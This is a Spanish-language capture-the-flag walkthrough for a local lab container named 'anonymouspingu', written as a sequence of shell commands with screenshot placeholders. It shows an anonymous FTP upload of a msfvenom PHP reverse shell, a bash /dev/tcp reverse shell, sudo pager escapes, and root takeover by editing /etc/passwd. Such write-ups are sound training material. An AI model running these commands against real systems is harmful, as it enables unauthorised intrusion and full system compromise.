
Desplegamos el contenedor:

```Bash
bash auto_deploy.sh anonymouspingu.tar
```

![[Pasted image 20250206154045.png]]

Escaneamos la IP:

```Bash
nmap -sV -sC -sS -T 5 -n -Pn -p- 172.17.0.2
```

![[Pasted image 20250206154119.png]]

```Bash
ftp 172.17.0.2
```

![[Pasted image 20250206154154.png]]

```Bash
anonymous
```

![[Pasted image 20250206154211.png]]

```Bash
ls
```

![[Pasted image 20250206154233.png]]

```Bash
cd upload
```

![[Pasted image 20250206155319.png]]

Nos metemos en la web:

![[Pasted image 20250206154434.png]]

Creamos payload que vamos a subir:

```Bash
msfvenom -p php/reverse_php LHOST=172.17.0.1 LPORT=4444 -f raw > shell.php
```

![[Pasted image 20250206155103.png]]

```Bash
put shell.php
```

![[Pasted image 20250206155254.png]]

Nos ponemos a la escucha con **netcat**:

```Bash
nc -lnvp 4444
```

![[Pasted image 20250206155207.png]]

Nos ponemos otra:

```Bash
nc -lnvp 443
```

![[Pasted image 20250206155218.png]]

![[Pasted image 20250206155401.png]]

Miramos en la shell:

![[Pasted image 20250206155425.png]]

Nos la mandamos a la otra shell:

```Bash
bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"
```

![[Pasted image 20250206155440.png]]

Miramos la otra shell:

![[Pasted image 20250206155506.png]]

Tratamiento **tty**:

En la shell de nuestro kali:

```Bash
stty size
```

![[Pasted image 20250206165349.png]]

En la shell víctima:

```Bash
script /dev/null -c bash
```

![[Pasted image 20250206165438.png]]

```Bash
cntrl + z
```

![[Pasted image 20250206165508.png]]

```Bash
stty raw -echo;fg
```

![[Pasted image 20250206165522.png]]

```Bash
reset xterm
```

![[Pasted image 20250206165533.png]]

```Bash
export TERM=xterm
```

![[Pasted image 20250206165554.png]]

```Bash
export SHELL=bash
```

![[Pasted image 20250206165609.png]]

```Bash
stty rows 36 columns 150
```

![[Pasted image 20250206165647.png]]

Elevamos privilegios:

```Bash
sudo -l
```

![[Pasted image 20250206155539.png]]

```Bash
sudo -u pingu /usr/bin/man man
```

![[Pasted image 20250206162526.png]]

```Bash
!/bin/bash
```

![[Pasted image 20250206162724.png]]

```Bash
whoami
```

![[Pasted image 20250206162744.png]]

Elevamos privilegios de nuevo:

```Bash
sudo -l
```

![[Pasted image 20250206162834.png]]

```Bash
sudo -u gladys dpkg -l
```

![[Pasted image 20250206163141.png]]

```Bash
!/bin/bash
```

![[Pasted image 20250206163447.png]]

```Bash
whoami
```

![[Pasted image 20250206163513.png]]

Elevamos privilegios de nuevo:

```Bash
sudo -l
```

![[Pasted image 20250206163523.png]]

```Bash
sudo -u root /usr/bin/chown gladys:gladys /etc/
```

![[Pasted image 20250206164638.png]]

```Bash
sed -i 's/root:x:/root::/g' /etc/passwd
```

![[Pasted image 20250206164649.png]]

```Bash
su root
```

![[Pasted image 20250206164702.png]]

```Bash
whoami
```

![[Pasted image 20250206164722.png]]

Otra forma en vez de vaciar la contraseña es creando otro root:

```Bash
echo 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd
```

![[Pasted image 20250206170353.png]]

```Bash
su root2
```

![[Pasted image 20250206170423.png]]

```Bash
whoami
```

![[Pasted image 20250206170448.png]]

